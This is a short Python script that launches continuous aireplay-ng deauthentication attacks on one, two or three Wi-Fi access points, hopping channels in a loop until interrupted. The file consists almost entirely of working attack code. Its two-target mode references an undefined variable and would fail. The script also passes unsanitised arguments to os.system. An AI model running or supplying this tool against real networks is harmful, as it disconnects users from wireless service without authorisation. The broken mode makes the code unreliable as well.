import os, sys, time

mode = sys.argv[1]

if mode == "1":
	bssid = sys.argv[2]
	chnnl = sys.argv[3]
	iface = sys.argv[4]
	os.system("iwconfig %s channel %s" % (iface, chnnl))
	os.system("aireplay-ng -D -0 0 -a %s %s" % (bssid, iface))

if mode == "2":
	bssid0 = sys.argv[2]
	chnnl0 = sys.argv[3]
	bssid1 = sys.argv[4]
	chnnl1 = sys.argv[5]
	iface = sys.argv[6]
	try:
		while 1==1:
			os.system("iwconfig %s channel %s" % (iface, chnnl0))
			os.system("timeout 2s aireplay-ng -D -0 0 -a %s %s" % (bssid0, iface))
			os.system("iwconfig %s channel %s" % (iface, chnnl[1]))
			os.system("timeout 2s aireplay-ng -D -0 0 -a %s %s" % (bssid1, iface))
			time.sleep(1)
	except KeyboardInterrupt:
		sys.exit(1)

if mode == "3":
	bssid = [sys.argv[2], sys.argv[4], sys.argv[6]]
	chnnl = [sys.argv[3], sys.argv[5], sys.argv[7]]
	iface = sys.argv[8]

	try:

		while 1==1:

			os.system("iwconfig %s channel %s" % (iface, chnnl[0]))
			os.system("timeout 2s aireplay-ng -D -0 0 -a %s %s" % (bssid[0], iface))
			os.system("iwconfig %s channel %s" % (iface, chnnl[1]))
			os.system("timeout 2s aireplay-ng -D -0 0 -a %s %s" % (bssid[1], iface))
			os.system("iwconfig %s channel %s" % (iface, chnnl[2]))
			os.system("timeout 2s aireplay-ng -D -0 0 -a %s %s" % (bssid[2], iface))

			time.sleep(1)

	except KeyboardInterrupt:
		sys.exit(1)
